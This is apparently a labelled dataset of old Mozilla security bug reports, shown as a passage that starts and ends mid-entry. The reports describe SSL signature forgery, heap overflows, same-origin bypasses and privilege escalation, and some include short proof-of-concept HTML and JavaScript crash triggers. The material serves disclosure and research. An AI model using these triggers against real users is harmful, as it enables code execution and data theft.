unchecked part provides enough play ground for an adversary if you are interested i could provide some more detail here on the mathematics the key point is that with exponent 3 you can use computing 3rd roots over the real numbers not modulo n the rsa modulus the former is easy while the hardness of the latter is the usual security assumption for rsa so basically when a certificate uses exponent 3 we can produce a fake signature that is accepted by this code here is how to exploit that the function rsa_checksign is called during ssl/tls connection setup when the server sends a serverkeyexchange message this message contains new keys to be used by the client for exchange of the premaster secret the keys are signed by the key in the server certificate for validation the firefox client computes the md5||sha1 combined hash of the key parameters plus the public random bytes and checks that against the signature of the server using the rsa_checksign function so a man-in-the-middle attack is easy when a site uses a certificate containing an rsa key with exponent 3 the adversary sends the certificate he does not have the private key and then also sends a serverkeyexchange message containing the fake signature this can easily be produced only the computation is quick so basically the certificate chain can be exploited to make the client believe it is connected to the original server while it is not phishing etc is easy now if you have any further questions please do not hesitate to contact me attached you will find my gpg key and a diff of the relevant portion of 1.5.0.7 against 2.0b1 which fixes the problem please seriously consider providing a patch for 1.5.0.7 with best regards ulrich kuehn	5
crash js_dtoa/jsdtoa.c when running with reduced cpu float precision e.g after loading direct3d plugin attachment i ll attach 2 plugins based on the example plugin plugin basic-crash sets up direct3d and creates a direct3d device the other plugin basic is identical just that it does not call createdevice see ifdef firefox_crash at bottom of dx8test.cpp and of course has a different mimetype to differentiate them reproduction 1 make sure you have directx 8 and 3d drivers installed and working 2 copy the attached plugins plugings/np dll into your plugins dir 3 load test.html 4 click on first link for good plugin calls the basic plugin 5 click on last link for a new window/tab with a normal html page 6 click on first link for crash plugin calls the basic_crash plugin 7 click on last link for a new window/tab with a normal html page 8 crash builds i tested this with firefox 2.0 all the way back to firebird 0.6 they all consistently crash however no mozilla or seamonkey does i tested mozilla 1.4 up to seamonkey 1.5 trunk nightlies so this is clearly caused or at least triggered by firefox or toolkit changes stacktrace if you do that with a debug build and debugger you ll see an infinite recursion in ntdll i did n't see anything else in the stack dropdown the visual studio debugger only 100 or so times ntdll or is there a way to see the full stack i have no idea how to further localize this problem other than it being a bug introduced by firefox changes	11
exploitable crash when appending svg comment to element in a non-svg document zdi-can-126 zdi-can-126 mozilla firefox svg processing remote code execution abstract 3com has identified a vulnerability affecting the following products mozilla firefox 1.5.0.7 mozilla firefox 2.0 vulnerability details this vulnerability allows remote attackers to execute arbitrary code on systems with affected installations of mozilla firefox exploitation requires that the target user visit a malicious web page the flaw exists in the browser s handling of svg comment objects firefox does not correctly handle requests to append svg comments to elements in other types of documents attempting such an operation results in memory corruption that can be trivially exploited to execute arbitrary code memory corruption can be produced by attempting to append an svg comment node from a document contained in a child frame to an html element in the parent document with that element s appendchild method credit this vulnerability was discovered by anonymous information about the zdi the zero day initiative zdi represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities	9
firefox 2.0 svg cairo_pen_init heap overflow user-agent mozilla/5.0 macintosh u intel mac os x en-us rv:1.9a1 gecko/20061113 minefield/3.0a1 build identifier mozilla/5.0 macintosh u intel mac os x en-us rv:1.9a1 gecko/20061113 minefield/3.0a1 firefox 2.0 svg cairo_pen_init heap overflow versions affected firefox 2.0 platforms affected apple mac osx 10.4 and prior windows xp linux overview when processing a specially crafted svg file this will cause firefox to crash this allows for an attacker to cause firefox to crash and or to execute arbitrary code probably a tough one on a targeted host technical details the following svg code below will reproduce this issue clippath stroke-width 2000000000000000 color 1 line line clippath below is the crash when running firefox within gdb on osx 10.4.7 program received signal exc_bad_access could not access memory reason kern_invalid_address at address in cairo_pen_init gdb bt 0 in cairo_pen_init 1 in cairo_gstate_stroke_extents 2 in cairo_stroke_extents 3 in nssvgcairopathgeometry getcoveredregion 4 in nssvgcairopathgeometry update 5 in nssvgpathgeometryframe updategraphic 6 in nssvgpathgeometryframe notifyredrawunsuspended 7 in nssvgdefsframe notifyredrawunsuspended 8 in nssvgoutersvgframe unsuspendredraw 9 in nssvgoutersvgframe didreflow 10 in canvasframe reflow 11 in nscontainerframe reflowchild 12 in nshtmlscrollframe reflowscrolledframe 13 in nshtmlscrollframe reflowcontents 14 in nshtmlscrollframe reflow snip reproducible always	11
2 problems in mimerichtextconvert 2 problems in mimerichtextconvert 106 seawood 1.13 the code below must never expand the input by more than 5x 107 mstoltz 1.12 if it does the desired_size multiplier 5 below must be changed too 108 1 desired_size length 5 1 109 rhp 1.1 2 if desired_size obuffer_sizep 110 status mime_growbuffer desired_size sizeof char 1024 111 obufferp obuffer_sizep so 2 problems a desired_size may be negative even on 32 bit systems at the cost of 1.8g vm 425m length the check at 2 is useless in this case b on 64 bit systems 1 may overflow at the cost of about 3.6g vm 850m length this may work in theory on 32 bit systems but could reproduce it only on a 64 bit system stack from the negative case program received signal sigsegv segmentation fault switching to thread 1223984304 lwp 4848 in strcpy from lib/i686/libc.so.6 gdb bt 0 in strcpy from lib/i686/libc.so.6 1 in pl_strcpy dest am address out of bounds src amp at opt/joro/thunderbird20/mozilla/nsprpub/lib/libc/src/strcpy.c:46 2 in mimerichtextconvert line repeats 200 times length=445644801 output_fn mime_output_fn closure obufferp obuffer_sizep enriched_p=1 at opt/joro/thunderbird20/mozilla/mailnews/mime/src/mimetric.cpp:167 3 in mimeinlinetextrichtext_parse_line line repeats 200 times length=445644801 gdb frame 2 2 in mimerichtextconvert line repeats 200 times length=445644801 output_fn mime_output_fn closure obufferp obuffer_sizep enriched_p=1 at opt/joro/thunderbird20/mozilla/mailnews/mime/src/mimetric.cpp:167 167 pl_strcpy out amp out strlen out gdb x/4c out 38 97 a 109 m can not access memory at address gdb x/4c out-20 38 97 a 109 m 112	11
ssl2 client vulnerability in non-debug builds this vulnerability was reported to security mozilla.org by email from vendor-disclosure idefense.com bearing the subject idef1973 it says this vulnerability was reported to idefense by regenrecht an ssl server cert with an rsa public key that is too small to encrypt the entire ssl2 master secret will cause optimized not debug nss builds to crash and/or execute attacker-supplied code on some platforms disabling ssl2 is a complete defense products with ssl2 disabled are believed to be invulnerable the bug has been present in nss since at least nss 3.4 and probably longer function ssl_formatssl2block starts with an assertion that the modulus is long enough to properly encode the data to be encrypted but that only has effect in debug builds in non-debug builds when the modulus is too short the code overruns the end of the too-short buffer the fix is to detect too-short modulii in all builds not just debug builds this probably should not be an assert at all but just a run time check	11
ssl2 server vulnerability reported this vulnerability was reported to security mozilla.org by email from vendor-disclosure idefense.com bearing the subject idef1994 it says this vulnerability was reported to idefense by regenrecht according to the report nss may allow an attacker to cause a stack-based buffer overflow and execute arbitrary code on the affected application the described attack occurs in ssl2 processing in code executed only by processes acting as ssl2 servers this vulnerability does not affect clients disabling ssl2 is believed to be a complete defense products with ssl2 disabled are believed to be not at risk from this vulnerability as of this writihg the bug is not yet confirmed more details will be provided if/when it is confirmed	11
mz2 file action dialog controls vulnerable to refocus race affected mechanism as a measure to prevent malicious trickery or human errors some controls in several security-related dialogs are disabled grayed out when the window first displayed or when focus is removed from the dialog and re-enabled by a delay timer after about 1 second after focus is gained attack vector on certain file-related prompts re-enable timer is not stopped if focus is again removed before the initial timer had a chance to expire when this happens controls in a blurred window are re-enabled while the dialog is hidden only to be instantly clickable when the window emerges from underneath a programatically closed decoy this is confirmed on windows and may work differently on other platforms depending on wm focus raise policies impact any web page that can elicit user to click a particular region in an open window or to hit return at a roughly predictable moment can use this to run potentially dangerous files without user consent test case see url to fix be sure to remove any pending refocus timers on blur on all dialogs that implement such a mechanism	11
loadbindingdocument does n't do any security checks in fact the only check it does is that the scheme of the document loadbindingdocument is called on matches the scheme of the document it s going to hand back if they do n't match it hands back null consequences 1 web sites can use this method to load data from file though they ca n't read it this includes things like dev/stdin etc 2 web sites can use this to load xbl from other sites and get access to the full dom of the binding document the xml does need to contain a bindings tag in the xbl namespace so it s not quite as bad as allowing arbitrary xml fetches but still pretty bad ideally we would do the following checks here a checkloaduri b content policy check c same-origin check against uri to load d same-origin check on redirects basically whatever xmlhttprequest does i really wish we did n't hand back the document here i ca n't really see a use case for it and we would n't need checks c and d above probably if all we did was to load the document somewhere internally maybe that s the way to go	2
fix about blank loaded by chrome in particular ways has chrome privileges window.open about blank content.location about blank about blank loaded by chrome in these ways has chrome privileges this behavior could cause security issues in certain extensions that are thinking that about blank does not have chrome privileges imagine an extension that does 1 collect urls from content 2 load about blank window.open about blank or content.location about blank 3 generate links with the urls and insert those into the about blank document when an user clicks a javascript link in the generated page the script run with chrome privileges i m not sure whether this should be fixed or not if not we need to advertise the potential problem there is an affected extension on amo test evaluate the following code in the error console w=open about blank alert 1 u javascript alert components.stack w.document.body.innerhtml=u.link u w.focus 1 or top.opener.content.location about blank alert 1 u javascript alert components.stack w=top.opener.content document.body.innerhtml=u.link u w.focus 1	2
escape uris especially quotes when passing them to external protocol handlers different takes on this from different people biesi has a patch for nsoshelperappservice.cpp	9
uris with invalid encodings launch wrong handler on winxp+ie7 spun off from bug 389580 which was marked fixed with the landing of an incomplete fix and that s masked the remaining work on windows xp with ie7 installed but not xp+ie6 or vista with ie7 uris handed off to shellexecute for launching with an external protocol handler can be handed off to an unexpected file handler based on the extension of the uri if the uri contains a followed by an invalid hex sequence or 00 but that was wallpapered in 389580 per bug 389580 comment 36 the affected schemes are http https ftp file gopher telnet mailto news snews nttp wais mk handling the schemes internally avoids the problem but firefox will call the os for mail uris and thunderbird will hand off http and the like in bug 389580 comment 37 jmathies attached a first cut at validating uris through the newly-introduced windows api createuri which will exist on all systems affected by this bug this approach means we do n't have to try to guess what windows is doing and worry about whether our list of schemes is complete or not this bug is filed to continue this work in a new space the old bug made release tracking impossible because of the confusing flags already set and the fact that fixed bugs are invisible to the ff3/gecko1.9 planners	9
fix assertion not in child list and crash with position inherit counters first-line loading the testcase triggers three assertions assertion not in child list found file users/jruderman/trunk/mozilla/layout/base/nscssframeconstructor.cpp line 1767 assertion did n't find frame to delete result file users/jruderman/trunk/mozilla/layout/generic/nsabsolutecontainingblock.cpp line 128 assertion no placeholder frame for out-of-flow frame not reached file users/jruderman/trunk/mozilla/layout/generic/nsframe.cpp line 5447 if i try to resize the firefox window at this point it often crashes nsspacemanager createframeinfo nsiframe getstyledisplay dereferencing this happens most reliably if i launch firefox with the testcase filename on the command line	11
local java applet may read arbitrary files under certain circumstances recent trunk has restrictions on what local html can access in bug 402998 comment 8 someone with sun.com email asked to post a test for local applet circumventing restrictions it is like beating a death horse but here it is if the path of the locally saved applet is known at applet compile time the applet can read any file note that if the luser saves files in a single directory a two stage attack may be successful with high probability suppose the applet is saved in directory tmp/dumbuglyb1llmarrieddumbuglyb1tch it should be instantiated like this applet codebase file code tmp.dumbuglyb1llmarrieddumbuglyb1tch.a1 applet and the applet should contain this is the path to the applet filename package tmp.dumbuglyb1llmarrieddumbuglyb1tch public class a1 extends applet	2
out of bounds read in bmp decoder can lead to information disclosure full credit goes to michael skladnikiewicz who reported this to security mozilla.org in an email with subject mozilla firefox 2.0.0.11 3.0b2pre and prior remote information disclosure his initial email is quoted below hi credit gynvael coldwind vexillium with help from udevd and pornel i did n't know about canvas d ok here is how it goes firefox has a problem in handling 8bit bmp files the bmp format has a field in the bitmapinfoheader named biclrused the field says how many colors does the palette contain if this field is 0 then 256 color pallet is used when this field is not 0 the palette has the given number of colors now this is how it goes in firefox 1 firefox allocates 256 sizeof rgb for the palette 2 it copies the biclrused colors from the bmp file well what is missing is 1a memset pallete 0 256 sizeof rgb the palette still contains old data from the heap now we take a bmp file sized 256x1x8 with biclruser 0 and fill the bitmap with gradient from 0 to 255 00 01 02 03 04 05 and so on when displayed the bmp file looks chaotic and in fact it contains the palette copied to the screen here is where html 5.0 comes in and canvas you can imagine the rest but i ll write it anyway you can create a html/javascript that copies the image from img to a canvas and then gets it data and for example using a form posts it to some remote server this has been tested and it works there is a poc exploit in the bottom the harvested data contains mainly trash but there are also parts of other websites parts of java scripts even parts of favorites well if there are also cookies and passwords in heap then they are also reachable i ve attached also the scripts and the leak.bmp bitmap this will be posted on bugtraq as soon as a fixed version of firefox is released please check also thunderbird for this issue i did n't check best regards looking forward to your reply michael gynvael coldwind skladnikiewicz team vexillium hispasec	11
file location url in directory listing should be html escaped user-agent mozilla/5.0 windows u windows nt 5.0 en-us rv:1.9b3pre gecko/2008010813 minefield/3.0b3pre build identifier when dropping file its name contains from explorer or desktop to browser browser opens incorrect file reproducible always steps to reproduce 1.create file named test gt 21.html in a foloder 2.open the folder with browser 3.click link to test gt 21.html actual results error file not found for firefox ca n't find the file at test 21.html expected results file should be opened according to dom inspector value of href of a element in directory view is test 2521.html so it should be test gt 2521.html	9
crash getchildlistnamefor with moz-column position absolute loading the testcase makes firefox crash getchildlistnamefor dereferencing	11
buffer overflow in external mime bodies idefense reports the following mailnews bug ii description remote exploitation of a heap based buffer overflow vulnerability in mozilla organization s thunderbird could allow an attacker to execute arbitrary code with the privileges of the current user the vulnerability exists when parsing the external-body mime type in an electronic mail when calculating the number of bytes to allocate for a heap buffer sufficient space is not reserved for all of the data being copied into the buffer this results in up to 3 bytes of the buffer being overflowed potentially allowing for the execution of arbitrary code a partial listing of the mimeexternalbody_make_url function line numbers based on the source code of version 2.0.0.9 from mailnews/mime/src/mimeebod.cpp is shown below 230 else if nscrt strcasecmp at mail-server char s2 if svr return 0 235 s char pr_malloc strlen svr 4 subj strlen subj 4 0 body strlen body 4 0 20 if s return 0 239 pl_strcpy s mailto s2 nsescape svr url_xalphas if s2 244 pl_strcat s s2 nscrt free s2 if subj 250 s2 nsescape subj url_xalphas 251 pl_strcat s subject if s2 254 pl_strcat s s2 nscrt free s2 if body 260 s2 nsescape body url_xalphas 261 pl_strcat s subj body body if s2 264 pl_strcat s s2 nscrt free s2 return s 268 at line 235 a heap buffer is allocated the 20 is meant to reserve enough space for the strings copied into the buffer at lines 239 251 and 261 however the combined length of these strings is 23 bytes including the null byte at the end depending on the underlying memory allocator this can result in the corruption of heap memory iii analysis exploitation of this vulnerability results in the execution of arbitrary code with the privileges of the user running thunderbird exploitation requires that an attacker social engineers a user into viewing a malicious message in thunderbird if the view message pane option is turned on the preview pane which is the default then all a targeted user has to do is select the message in the browsing pane once the message is previewed the vulnerability will be triggered due to the limited scope of the overflow exploitation is difficult and has not yet been proven in the labs however this vulnerability still has the potential to be exploitable and should be treated as such iv detection idefense has confirmed the existence of this vulnerability in thunderbird version 2.0.0.9 on linux and windows previous versions may also be affected v workaround setting the mailnews.display.disallow_mime_handlers configuration property to any value 3 will prevent the vulnerable code from being triggered in order to do this 1 go to the tools options advanced config editor in the windows version or edit preferences advanced config editor in the linux version 2 type the property name into the filter box mailnews.display.disallow_mime_handlers 3 double click the property and set its value to 3	11
rdfxmldatasource should reject cross-domain redirects it is possible to still rdf from any http hosts via datasources cgi-bin/re if the rdf structure is known cgi-bin/re does a http redirect testcase wo n't work from bugzilla not clear if this allows stealing arbitrary xml both trunk and 2.0 are vulnerable	5
fix it s unsafe to use mozijssubscriptloader.loadsubscript with non-chrome urls or chrome urls whose scheme/host part contain uppercase characters it s unsafe to use mozijssubscriptloader.loadsubscript with non-chrome urls or chrome urls whose scheme/host part contain uppercase characters scripts that are loaded in this way do not use implicit xpcnativewrappers when accessing content loader.loadsubscript chrome test safe loader.loadsubscript chrome test unsafe loader.loadsubscript file unsafe google toolbar uses mozijssubscriptloader.loadsubscript with file url and allows an attacker to run arbitrary code with chrome privileges	2
non-chrome xul documents can load chrome scripts from the fastload file without using overlay non-chrome xul documents can load chrome scripts from the fastload file by using script elements this is exploitable in the same way as bug 390813	2
heap overflow when canceling usenet message in nsnntpprotocol docancel this is not trivial to reproduce but seems wrong by inspection 4255 mscott 1.1 l pl_strlen id 4258 other_random_headers char pr_malloc l 20 4339 pl_strcpy other_random_headers control cancel 4340 pl_strcat other_random_headers id 4341 pl_strcat other_random_headers crlf 4342 sspitzer 1.73 if distribution 4343 bienvenu 1.348 pl_strcat other_random_headers distribution 4344 scott 1.386 pl_strcat other_random_headers distribution 4345 pl_strcat other_random_headers crlf so other_random_headers is allocated strlen id 20 later id stuff is copied later distribition may be appended yet distribution does n't contribute to the allocation size and this may lead to overflow even control cancel distribution is longer than 20	11
crash on login to excite japan blog exblog.jp after updating to firefox 2.0.0.13 js_markgcthing some japanese users reported that they have encountered crashes on login to excite blog after updating to firefox 2.0.0.13 error message says the instruction at referenced memory at the memory could not be read click ok to terminate the application both on windows and mac no problem with the secure mode login with ssl no problem when login from the home page crash when login form login links on each blogs	11
bom characters are stripped from javascript before execution user-agent mozilla/4.0 compatible msie 7.0 windows nt 6.0 slcc1 net clr 2.0.50727 infopath.2 net clr 3.0.04506 net clr 3.5.30319 wwtclient2 build identifier 2.0.0.13 using control format unicode characters it is possible for code that will be executed to exist inside what would otherwise appear to be a quoted javascript string the same technique can be used to escape out of block comments reproducible always steps to reproduce execute the following javascript function evil alert evil return evil alert eval a\\\u200d evil actual results alert evil appears then an aldert a evil expected results only one alert a evil should appear see url for more	9
assertion failure obj_is_native obj with proto mangling loading the testcase kills firefox debug assertion failure obj_is_native obj at users/jruderman/central/mozilla/js/src/jslock.cpp:1187 opt hang security-sensitive for now because i do n't know whether this is a memory safety bug in opt builds	9
same-origin check in nsxmldocument onchannelredirect can be circumvented this is fx2-only on trunk the same-origin check in question compares an old uri to a new uri the same-origin check in nsxmldocument onchannelredirect uses a principal of an associated js context it can be circumvented by loading a cross-origin page in that context before nsxmldocument onchannelredirect is called by using this trick it s possible to change a principal of an xml document and thus an attacker can perform an xss attack upcoming testcase consists of an html and a cgi script thus it does not work on bugzilla.mozilla.org please set up it in a suitable place	2
exploitable crash at nsblockframe drainoverflowlines this was reported to mozilla today by isight partners i can confirm that the poc page which i ll attach shortly crashes firefox 2.0.0.14 on all three platforms on mac i crash with the stack pasted below note that address space that we crash on is identical to that mentioned in the advisory the full report is attached process firefox-bin 28540 path applications/firefox 2.app/contents/macos/firefox-bin identifier org.mozilla.firefox version 2.0.0.14 2.0.0.14 code type x86 native parent process launchd 1 date/time 2008-06-17 15:03:57.922 0700 os version mac os x 10.5.3 9d34 report version 6 exception type exc_bad_instruction sigill exception codes crashed thread 0 thread 0 crashed 0 0 33686018 1 org.mozilla.firefox nsblockframe drainoverflowlines nsblockreflowstate 959 2 org.mozilla.firefox nsblockframe computefinalsize nshtmlreflowstate const nsblockreflowstate nshtmlreflowmetrics 2498 3 org.mozilla.firefox nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int 94 4 org.mozilla.firefox canvasframe gettype const 1358 5 org.mozilla.firefox nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int 94	11
firefox cssvalue array memory corruption vulnerability zdi submitted the following advisory to us via mail to security mozilla.org abstract tippingpoint has identified a vulnerability affecting the following products mozilla firefox 2.0.x mozilla firefox 3.0.x vulnerability details this vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of mozilla firefox user interaction is required to exploit this vulnerability in that the target must visit a malicious page the specific flaw exists in the browser s handling reference counters to the nscssvalue array class creating more then 65,535 references will overflow a 16-bit reference counter and therefore result in an erroneous free while the object still exists properly manipulated this can result in arbitrary code execution under the context of the current user most reference counters are implemented as unsigned longs and can not be feasible overflowed with too many reference however the nscssvalue array class uses a 16-bit wide value layout/style/nscssvalue.h lines 321-335 void addref mrefcnt ns_log_addref this mrefcnt nscssvalue array sizeof this void release mrefcnt ns_log_release this mrefcnt nscssvalue array if mrefcnt 0 delete this private pruint16 mrefcnt pruint16 mcount an attacker can create an arbitrary number of references to this object by creating a style definition with counter-increment counter-reset cursor or text-shadow attribute setting one of those attributes to an arbitrary html object creates a reference to this object creating more than 65535 html objects with reference to this style definition will overflow the reference counter which will lead to a freeing of the object whilst references to it still exist credit this vulnerability was discovered by anonymous	11
crash when closing open rdf files or right click on tree after opening rdf files nsxultemplatequeryprocessorrdf checkisseparator user-agent mozilla/5.0 windows u windows nt 5.1 fr rv:1.9 gecko/2008052906 firefox/3.0 build identifier mozilla/5.0 windows u windows nt 5.1 fr rv:1.9 gecko/2008052906 firefox/3.0 a xul window loading 2 rdf files in a tree absolutely no problem with flock under windows mozilla/5.0 windows u windows nt 5.1 en-us rv 1.8.1.14 gecko/20080530 firefox 2.0.0.14 flock/1.2.1 that is say that i could see a tree that data in the second file rdf similarly if we turn opens and closes files via the appropriate buttons no crash but with ff3 under windows my tree retains data in the first rdf and if you play a little with files rdf open and then close them and open them by clicking on the tree etc on a most likely to have crashes under ubuntu 8.04 i crash but no proposal of sending report crashes below links to the first 4 crashes generated by this window reproducible always steps to reproduce 1.open a new firefox 3 2.go to 3.click on button 1 4.close the window with rdf file 5.right click on tree 6 do it 2 or 3 times if does n't crash at the first time	11
mtd with huge rowspan causes crash with sad nscellmap steps to reproduce 1 load the testcase in a debug build firefox trunk on tiger result sometimes firefox-bin 17051 malloc error for object pointer being reallocated was not allocated firefox-bin 17051 malloc set a breakpoint in szone_error to debug assertion invalid array index i length file dist/include/xpcom/nstarray.h line 317 always a crash at one of the following nscellmap appendcell nstarray_base ensurecapacity nscellmap setdataat nstarrayelementtraits celldata construct celldata nscellmap appendcell celldata isorig all of the crashes involve non-null bogus pointer dereferences for the first crash signature this is easiest to see with export mallocscribble=1 export mallocprescribble=1	11
crash due to insufficient class checking in date class user-agent mozilla/5.0 windows u windows nt 5.1 en-gb rv:1.9.0.1 gecko/2008070208 firefox/3.0.1 build identifier this bug crashes the browser without any possibility for user intervention this is exploitable in the browser do not click the given link if you want to keep anything in your current firefox session reproducible always steps to reproduce new date getmonth.call new function actual results jsshell or firefox crash expected results exception the built-in date class does n't check the class of its this object sufficiently affected methods are getyear getmonth getdate and so on this affects all of date s methods that internally call getlocaltime in jsdate.c which does n't check the class of object passed in compare with js_instanceof call in getutctime the object passed in needs to have at least 2 private slots like a the global object b function objects c iterator objects the value from the private slot is passed to jsval_to_double without further checks in getlocaltime leading to bogus pointer dereference for objects not of class date in addition to adding this to the test suite this sort of thing could be added to jsparsefuzz.js i.e the fuzzer should be modified to use method call with random arguments if it s not already doing this i do n't have time right now to check out a current tree and post a patch and will not get around to it until some time next week	11
crash js_setpropertyhelper this.__definegetter x function x foo'.replace o/g 1 push for let y in for let y in x x js-moz190-intelmac-debug js this.__definegetter x function x foo'.replace o/g 1 push for let y in for let y in x x assertion failure js_property_cache cx disabled at jsinterp.c:97 trace/bpt trap blows opt builds at a possibly exploitable address then asserts debug with the above assertion mac 10.5.4 leopard nominating security sensitive because it crashes at a scary address	11
invisible control characters in url must not be decoded when showing its address user-agent mozilla/5.0 windows u windows nt 5.1 ja rv:1.9.0.1 gecko/2008070208 firefox/3.0.1 build identifier mozilla/5.0 windows u windows nt 5.1 ja rv:1.9.0.1 gecko/2008070208 firefox/3.0.1 invisible control characters 0b 0c 1c 1d 1e and 1f in url must not de decoded in location bar reproducible always steps to reproduce 1.goto 2.see your location bar 3 actual results location bar shows as decoded string but 0b 0c 1c 1d 1e and 1f not visible you will read it as expected results invisible characters 0b 0c 1c 1d 1e and 1f must not decoded on location bar according to result of other controll characters that between 00 and 7f does not have same problem this issue can be used to address bar spoofing	9
fix crash under nssvgelement bindtotree with svg use svg script steps to reproduce 1 load the testcase from a file url 2 wait 5-60 seconds result some kind of crash under nssvgelement bindtotree it may involve calling a bogus memory address you ll probably also see some of these assertions assertion no callbacks should be registered while we set up this entry entry hascontentchangecallback file users/jruderman/central/content/base/src/nsdocument.cpp line 3288 assertion please remove this from the document properly isindoc file users/jruderman/central/content/base/src/nsgenericelement.cpp line 1743 assertion already have a document unbind first getcurrentdoc isindoc file users/jruderman/central/content/base/src/nsgenericdomdatanode.cpp line 585 assertion shallow unbind wo n't clear document and binding parent on kids adeep getcurrentdoc getbindingparent file users/jruderman/central/content/base/src/nsgenericelement.cpp line 2730 assertion bound to wrong document adocument getcurrentdoc file users/jruderman/central/content/base/src/nsgenericelement.cpp line 2717 assertion bound to wrong parent aparent getparent file users/jruderman/central/content/base/src/nsgenericelement.cpp line 2718 the testcase is loosely based on dynamic-use-01.svg one of the most evil reftests in the mozilla tree	11
xml injection possible in e4x parsing via default xml namespace user-agent mozilla/5.0 x11 u linux i686 x86_64 en-us rv:1.8.1.16 gecko/20080716 firefox/2.0.0.16 build identifier mozilla/5.0 x11 u linux i686 x86_64 en-us rv:1.8.1.16 gecko/20080716 firefox/2.0.0.16 this javascript fragment illustrates the problem default xml namespace foo you will get an error error unterminated string literal source file line 162 column 16 source code parent xmlns blah the concern is that attacks may be possible via injecting xml into cross-domain xml via the script src facility reproducible always steps to reproduce 1 2 3	9
e4x/extensions/regress-374025.js invalid write this is fixed on the trunk and is a known crasher on 1.8.1 but i just realized it is a security issue 30135 invalid write of size 2 30135 at js_repeatchar jsscan.c:845 30135 by xmltoxmlstring jsxml.c:2709 30135 by xmltoxmlstring jsxml.c:3004 30135 by toxmlstring jsxml.c:3082 30135 by xml_toxmlstring jsxml.c:7168 30135 by js_invoke jsinterp.c:1387 30135 by js_internalinvoke jsinterp.c:1481 30135 by js_trymethod jsobj.c:4686 30135 by js_valuetosource jsstr.c:2718 30135 by str_uneval jsstr.c:470 30135 by js_invoke jsinterp.c:1387 30135 by js_interpret jsinterp.c:3964	11
integer overflow in nsescape this bug was initially created as a clone of bug 445117 xxx hardcoded max entity len the 1 is for the trailing null char rv char nsmemory alloc strlen string 6 1 6 overflows at about 683m on 32 bit platform the issue georgi noted in bug 445117 also occurs in xpcom/io/nsescape.cpp the same pattern happens in nsescapehtml and nsescapehtml2 i m not sure if you can practically stuff 683m into the things that use nsescapehtml maybe if the transport is gzipped	11
fix crash nsframemanager getprimaryframefor with invalid input type zdi-can-390 cameron hotchkies via the tippingpoint zero day initiative zdi reported this crash to security m.o the crash appears to be exploitable and i will attach a backtrace shortly from the advisory this vulnerability allows attackers to potentially execute arbitrary code on vulnerable installations of mozilla firefox user interaction is required to exploit this vulnerability in that the target must visit a malicious page the specific flaw exists when a dom method on a specific html form object is called before the object itself has actually completed it s initialization this will lead to a call of uninitialized data which can result in code execution under the context of the current user this race condition is triggered by changing the type property of a file input field to an invalid type before it actually gets rendered this can be done inside the onload callback of an object when the blur method for the input object is called firefox will make a method call to an uninitialized address during rendering doctype html public w3c//dtd html 4.01 transitional//en html head meta http-equiv content-type content text/html charset=utf-8 title wushi0016 title script type='text/javascript function goodbye nodelist document.getelementsbytagname input testnode nodelist.item 0 testnode.type yabba-dabba-do return testnode.blur script head body onload goodbye input type file body html	11
xmlhttprequest 302 response disclosure user-agent mozilla/5.0 x11 u linux i686 x86_64 en-us rv:1.9 gecko/2008052912 firefox/3.0 build identifier mozilla/5.0 x11 u linux i686 x86_64 en-us rv:1.9 gecko/2008052912 firefox/3.0 a xmlhttprequest which hits a 302 to another domain returns the 302 headers and body in single-signon environments these headers might contain sensitive url parameters the xmlhttprequest originates from source domain but the sso state could be protected with httponly returning the 302 headers allows for using the sso state as an oracle to mints access tokens for other domains all other browsers i tested do not return such 302 responses to the script reproducible always steps to reproduce 1.setup a server that has a 302 to another domain 2.issue xhr in domain to the url that will 302 3.observe the 302 headers and body are available to the xhr issuer actual results 302 headers and body with location being a different protocol host port/path params expected results security exception or no data other browsers return status 0 and no content or throw security exceptions since other browsers do not return data it is unlikely that tightening this up will break existing applications as for precedents regarding fixing this type of bug see	2
crash js_deflatestring function f for var i 1 i dps.length i var a var b var c function stringoflength n if n 0 return else if n 1 return else var r n 2 var d n r 2 var y stringoflength d return y y stringoflength r this.__definegetter x this.tosource while x.length 12000000 let q x s q q print x.length e4x x e4x huge thanks to jesse ruderman for helping to reduce this massive testcase these lines crash js trunk shell at this also asserts debug shell at assertion failure nbytes 0 at jsapi.cpp:1841 related to bug 421623 or bug 457521 nominating security sensitive because they crash at this scary address nominating wanted-1.9.0.x as well because we have seen variants of this testcase crashing 1.9.0.x	11
make document.documenturi and textcontent noaccess in mailnews see bug 453928 comment 5 we need to fix this on the 1.8 branch and 1.9.0 branch no matter what we re doing on trunk	2
it s possible to circumvent the inner window check in nsxmlhttprequest notifyeventlisteners this bug is for fx3.0.x and fx2.0.0.x in nsxmlhttprequest notifyeventlisteners checkinnerwindowcorrectness is called only once and then multiple listeners are called thus it s possible to circumvent the inner window check by using two listeners trunk is also exploitable in the same way but depends on bug 460001	1
fix memory exhaustion setting htmlselect.length gsec-tzo-26-2009 user-agent mozilla/5.0 windows u windows nt 5.1 de rv:1.9.0.3 gecko/2008092417 firefox/3.0.3 build identifier mozilla/5.0 windows u windows nt 5.1 de rv:1.9.0.3 gecko/2008092417 firefox/3.0.3 possible integer miscaluclation in select.length triggers huge memory allocations and then first and second chance access violations reproducible always steps to reproduce 1 open attachement 2 click on poc 3 first chance exceptions are reported before any exception handling this exception may be expected and handled eax=00000000 ebx=056ca0b0 ecx=00000000 edx=00290040 esi=069a7d8c edi=00000000 eip=605eea6b esp=0013e378 ebp=0013e5c8 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246 error symbol file could not be found defaulted to export symbols for c program files\mozilla firefox\xul.dll xul ns_newlocalfile_p 605eea6b 8b7718 mov esi dword ptr edi+18h ds:0023:00000018 0:000 analyze v exception analysis faulting_ip xul ns_newlocalfile_p+ddb 605eea6b 8b7718 mov esi dword ptr edi+18h exception_record ffffffff exr exceptionaddress 605eea6b xul ns_newlocalfile_p exceptioncode c0000005 access violation exceptionflags 00000000 numberparameters 2 parameter 0 00000000 parameter 1 00000018 attempt to read from address 00000018 faulting_thread 00000998 default_bucket_id application_fault process_name firefox.exe error_code ntstatus the instruction at 0x 08lx referenced memory at 0x 08lx the memory could not be s read_address 00000018 bugcheck_str access_violation ntglobalflag 70 application_verifier_flags 0 last_control_transfer from 00000000 to 605eea6b stack_text 0013e5c8 00000000 00000000 00000000 7c809a69 xul ns_newlocalfile_p 